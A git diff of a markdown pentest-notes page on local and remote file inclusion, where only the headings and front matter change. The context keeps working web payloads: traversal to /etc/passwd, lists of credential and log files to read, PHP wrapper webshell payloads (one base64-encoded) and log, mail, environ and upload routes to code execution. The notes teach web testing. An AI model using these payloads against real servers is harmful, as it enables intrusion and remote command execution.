@@ -1,23 +1,23 @@
 ---
-description: >-
-  File Inclusion refers to an inclusion attack through which an attacker can
-  trick the web application into including files on the web server.
+title: File Inclusion
+category: Web
+order: 1
 ---
 
-# File Inclusion
+File Inclusion refers to an inclusion attack through which an attacker can trick the web application into including files on the web server.
 
-## Introduction
+# Introduction
 
 Path Travesal can lead to two different types of File Inclusion:
 
 * **Local File Inclusion (LFI)**: When is possible to include a local file.
 * **Remote File Inclusion (RFI)**: When is possible to include remote files.
 
-## Path Traversal
+# Path Traversal
 
 Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.
 
-![Directory Traversal from PortSwigger Academy](../.gitbook/assets/pathtraversal.png)
+![Directory Traversal from PortSwigger Academy](/hackingnotes/images/pathtraversal.png)
 
 A search for path traversals begins with the examination of URL query strings and form bodies in search of values that appears as file references, including the most common indicator as file extensions.
 
@@ -39,11 +39,11 @@ https://insecure-website.com/loadImage?filename=../../../etc/passwd
 
 This causes the application to read from the following file path `/var/www/images/../../../etc/passwd`
 
-## Interesting Files
+# Interesting Files
 
 There are some interesting files to read, such as information about the server (users, groups), logs, etc...
 
-### Linux
+## Linux
 
 ```
 /etc/passwd
@@ -66,7 +66,7 @@ There are some interesting files to read, such as information about the server (
 /var/lib/mlocate.db
 ```
 
-### Apache
+## Apache
 
 ```
 /etc/apache2/apache2.conf
@@ -81,7 +81,7 @@ FreeBSD -> /var/log/httpd-access.log
 /var/log/apache/error.log
 ```
 
-### MySQL
+## MySQL
 
 ```
 /var/lib/mysql/mysql/user.frm
@@ -89,7 +89,7 @@ FreeBSD -> /var/log/httpd-access.log
 /var/lib/mysql/mysql/user.MYI
 ```
 
-### Windows
+## Windows
 
 ```
 /boot.ini
@@ -102,15 +102,15 @@ FreeBSD -> /var/log/httpd-access.log
 /windows/system32/eula.txt
 ```
 
-## Local File Inclusion (LFI)
+# Local File Inclusion (LFI)
 
 Its similar to Path Traversal but not exactly the same, the difference is, in file inclusion if we include a **PHP** it will be interpreted and executed while in path traversal not.
 
-### PHP Wrappers
+## PHP Wrappers
 
 PHP provides several protocols wrappers that we can use to exploit path traversal and local file inclusion vulnerabilities. These filters give us additional flexibility when attempting to inject PHP code via LFI vulnerabilities.
 
-#### Wrapper data://
+### Wrapper data://
 
 Used to embed inline data as part of the URL with plaintext or base64.
 
@@ -120,7 +120,7 @@ Used to embed inline data as part of the URL with plaintext or base64.
 /include.php?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&cmd=id
 ```
 
-#### Wrapper filter://
+### Wrapper filter://
 
 Used to encode/convert files. Usefull to read php files. The part of `php://filte`r is case insensitive.
 
@@ -138,7 +138,7 @@ php -a
 readfile('php://filter/zlib.inflate/resource=test.deflated');
 ```
 
-#### Wrapper zip://
+### Wrapper zip://
 
 Upload a Zip file with a PHPShell inside and access it.
 
@@ -151,7 +151,7 @@ rm payload.php
 http://example.com/index.php?page=zip://shell.jpg%23payload.php
 ```
 
-#### Wrapper expect://
+### Wrapper expect://
 
 Used to execute code.
 
@@ -159,7 +159,7 @@ Used to execute code.
 /include.php?file=except://id
 ```
 
-#### Wrapper input://
+### Wrapper input://
 
 Interpret php payload sent by POST parameters.
 
@@ -169,7 +169,7 @@ Interpret php payload sent by POST parameters.
 POST DATA: <?php system($_GET["cmd"]);?>
 ```
 
-## Remote File Inclusion (RFI)
+# Remote File Inclusion (RFI)
 
 When we are able to include remote files to the application is synonym of remote code execution. We can include a webshell or a reverse shell.
 
@@ -210,11 +210,11 @@ Some times `impacket-smbserver` doesn't works due to the outdated SMB version of
         guest ok = yes
 ```
 
-## Looking to RCE
+# Looking to RCE
 
 There are several ways to escalate a LFI to a RCE.
 
-### Via Log Poisoning
+## Via Log Poisoning
 
 We can poison the logs with the user agent.
 
@@ -230,7 +230,7 @@ And try to access to `/var/log/apache2/access.log`.
 /include.php?file=../../../../var/log/apache2/access.log&cmd=id
 ```
 
-### Via Email
+## Via Email
 
 If SMTP is open in the server we can easily send a mail to an internal account. "user@localhost" containing the following payload `<?php system($_GET["cmd"]);?>`
 
@@ -240,7 +240,7 @@ And access to the mail inbox of the user.
 /include.php?file=../../../../var/mail/user&cmd=id
 ```
 
-### Via Environ
+## Via Environ
 
 Like a log file, sending the payload in the User-Agent, it will be reflected inside the /proc/self/environ file.
 
@@ -250,7 +250,7 @@ Host: example.com
 User-Agent: <?php system($_GET["cmd"]);?>
 ```
 
-### Via Upload
+## Via Upload
 
 If exists a functionality that leads us to upload an arbitrary file, we can upload directly a reverse shell or simply upload a image with the payload injected on metadata.
 
@@ -266,7 +266,7 @@ Once uploaded we can access it.
 /include.php?file=../../uploads/myimage.jpg&cmd=id
 ```
 
-## References
+# References
 
 * [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)
 * [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
